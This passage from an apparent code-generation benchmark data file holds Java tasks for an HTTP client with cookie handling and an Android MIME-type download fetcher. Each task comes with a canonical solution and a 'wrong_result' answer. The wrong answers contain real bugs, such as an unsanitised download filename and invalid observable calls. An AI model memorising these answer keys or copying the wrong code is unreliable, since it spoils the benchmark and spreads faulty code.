= headers.get(\"Cookie\");\n        if (cookie == null) {\n            headers.put(\"Cookie\", config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else if (!cookie.contains(config.getRememberMeCookieName() + \"=\")) {\n            headers.put(\"Cookie\", cookie + \"; \" + config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else {\n            int start = cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;\n            int end = cookie.indexOf(\";\", start);\n            end = end == -1 ? cookie.length() : end;\n            headers.put(\"Cookie\", cookie.substring(0, start) + cookieValue + cookie.substring(end));\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        String requestBody = httpRequestInfo.getRequestBody();\n        if (requestBody != null && !requestBody.trim().equals(\"\")) {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            PrintWriter printWriter = new PrintWriter(connection.getOutputStream());\n            printWriter.write(requestBody);\n            printWriter.flush();\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (connection != null) connection.disconnect();\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private static final Config config = Config.getInstance();\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n            inputStream = connection.getInputStream();\n            baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n            return baos.toString();\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws Exception {\n        URL url = new URL(httpRequestInfo.getUrl());\n        if (config.getProxyHost() != null && !config.getProxyHost().isEmpty()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyHost(), config.getProxyPort()));\n            return (HttpURLConnection) url.openConnection(proxy);\n        } else {\n            return (HttpURLConnection) url.openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) throws Exception {\n        connection.setRequestMethod(httpRequestInfo.getMethod());\n        connection.setConnectTimeout(config.getConnectionTimeout());\n        connection.setReadTimeout(config.getReadTimeout());\n        connection.setUseCaches(false);\n        connection.setDoOutput(httpRequestInfo.isDoOutput());\n        connection.setDoInput(true);\n        configureCookie(connection.getRequestProperties(), cookieValue);\n        for (Map.Entry<String, String> entry : httpRequestInfo.getHeaders().entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        if (cookieValue != null && !cookieValue.isEmpty()) {\n            headers.put(\"Cookie\", cookieValue);\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        if (httpRequestInfo.isDoOutput() && httpRequestInfo.getBody() != null && !httpRequestInfo.getBody().isEmpty()) {\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(httpRequestInfo.getBody().getBytes());\n            }\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (baos != null) {\n                baos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a class that handles fetching MIME types from URLs and managing download requests using Android's DownloadManager.\n\nClass Description: The FetchUrlMimeType class is responsible for determining the MIME type of a resource at a given URL, setting up a download request with appropriate parameters, and enqueuing the download using Android's DownloadManager. It handles HTTP connections, processes response headers, and manages file naming and destination.\n\nAttributes:\n- mRequest: [DownloadManager.Request] - The download request to be configured and enqueued\n- mDownloadManager: [DownloadManager] - The Android DownloadManager instance used to enqueue downloads\n- mUri: [String] - The URL of the resource to be downloaded\n- mCookies: [String] - Optional cookies to be included in the HTTP request\n- mUserAgent: [String] - The user agent string to be used in the HTTP request\n\nMethods:\n- Constructor: [FetchUrlMimeType](DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) -> [void] - Initializes the class with download manager, request, URI, cookies, and user agent\n- create: [create]() -> [Single<Result>] - Creates and executes the download process, returning a Single observable with the result status. This method:\n  1. Establishes an HTTP connection to the URL\n  2. Extracts MIME type and content disposition from headers\n  3. Configures the download request with proper MIME type and filename\n  4. Enqueues the download request\n  5. Returns success/failure status through the observable\n\nNested Enum:\n- Result: [enum] - Represents possible outcomes of the download enqueue operation:\n  - FAILURE_ENQUEUE: Failed to enqueue the download request\n  - FAILURE_LOCATION: Failed due to storage location issues\n  - SUCCESS: Download successfully enqueued",
    "Canonical_solution": "import android.app.DownloadManager;\nimport android.os.Environment;\nimport android.util.Log;\nimport android.webkit.MimeTypeMap;\nimport android.webkit.URLUtil;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport acr.browser.lightning.utils.Utils;\nimport androidx.annotation.NonNull;\nimport io.reactivex.rxjava3.core.Single;\n\nclass FetchUrlMimeType {\n\n    private static final String TAG = \"FetchUrlMimeType\";\n\n    private final DownloadManager.Request mRequest;\n    private final DownloadManager mDownloadManager;\n    private final String mUri;\n    private final String mCookies;\n    private final String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager,\n                            DownloadManager.Request request,\n                            String uri,\n                            String cookies,\n                            String userAgent) {\n        mRequest = request;\n        mDownloadManager = downloadManager;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            String mimeType = null;\n            String contentDisposition = null;\n            HttpURLConnection connection = null;\n            try {\n                URL url = new URL(mUri);\n                connection = (HttpURLConnection) url.openConnection();\n                if (mCookies != null && !mCookies.isEmpty()) {\n                    connection.addRequestProperty(\"Cookie\", mCookies);\n                    connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                }\n                connection.connect();\n                if (connection.getResponseCode() == 200) {\n                    String header = connection.getHeaderField(\"Content-Type\");\n                    if (header != null) {\n                        mimeType = header;\n                        final int semicolonIndex = mimeType.indexOf(';');\n                        if (semicolonIndex != -1) {\n                            mimeType = mimeType.substring(0, semicolonIndex);\n                        }\n                    }\n                    String contentDispositionHeader = connection.getHeaderField(\"Content-Disposition\");\n                    if (contentDispositionHeader != null) {\n                        contentDisposition = contentDispositionHeader;\n                    }\n                }\n            } catch (@NonNull IllegalArgumentException | IOException ex) {\n                if (connection != null)\n                    connection.disconnect();\n            } finally {\n                if (connection != null)\n                    connection.disconnect();\n            }\n\n            if (mimeType != null) {\n                if (mimeType.equalsIgnoreCase(\"text/plain\")\n                    || mimeType.equalsIgnoreCase(\"application/octet-stream\")) {\n                    String newMimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(\n                        Utils.guessFileExtension(mUri));\n                    if (newMimeType != null) {\n                        mRequest.setMimeType(newMimeType);\n                    }\n                }\n                final String filename = URLUtil.guessFileName(mUri, contentDisposition, mimeType);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n            }\n\n            try {\n                mDownloadManager.enqueue(mRequest);\n                emitter.onSuccess(Result.SUCCESS);\n            } catch (IllegalArgumentException e) {\n                Log.e(TAG, \"Unable to enqueue request\", e);\n                emitter.onSuccess(Result.FAILURE_ENQUEUE);\n            } catch (SecurityException e) {\n                emitter.onSuccess(Result.FAILURE_LOCATION);\n            }\n        });\n    }\n\n    enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.app.DownloadManager;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Environment;\nimport io.reactivex.Single;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FetchUrlMimeType {\n    private DownloadManager.Request mRequest;\n    private DownloadManager mDownloadManager;\n    private String mUri;\n    private String mCookies;\n    private String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) {\n        this.mDownloadManager = downloadManager;\n        this.mRequest = request;\n        this.mUri = uri;\n        this.mCookies = cookies;\n        this.mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            try {\n                URL url = new URL(mUri);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                if (mCookies != null && !mCookies.isEmpty()) {\n                    connection.setRequestProperty(\"Cookie\", mCookies);\n                }\n                connection.setInstanceFollowRedirects(true);\n                connection.connect();\n\n                String mimeType = connection.getContentType();\n                String contentDisposition = connection.getHeaderField(\"Content-Disposition\");\n\n                String fileName = \"download\";\n                if (contentDisposition != null) {\n                    int beginIndex = contentDisposition.indexOf(\"filename=\");\n                    if (beginIndex != -1) {\n                        fileName = contentDisposition.substring(beginIndex + 9);\n                        fileName = fileName.replaceAll(\"\\\"\", \"\");\n                    }\n                }\n\n                if (mimeType == null || mimeType.isEmpty()) {\n                    mimeType = \"application/octet-stream\";\n                }\n\n                mRequest.setMimeType(mimeType);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName);\n\n                long downloadId = mDownloadManager.enqueue(mRequest);\n                if (downloadId == -1) {\n                    emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                } else {\n                    emitter.onSuccess(Result.SUCCESS);\n                }\n            } catch (IOException e) {\n                emitter.onSuccess(Result.FAILURE_LOCATION);\n            } finally {\n                emitter.onComplete();\n            }\n        });\n    }\n\n    public enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}\n```"
  }
]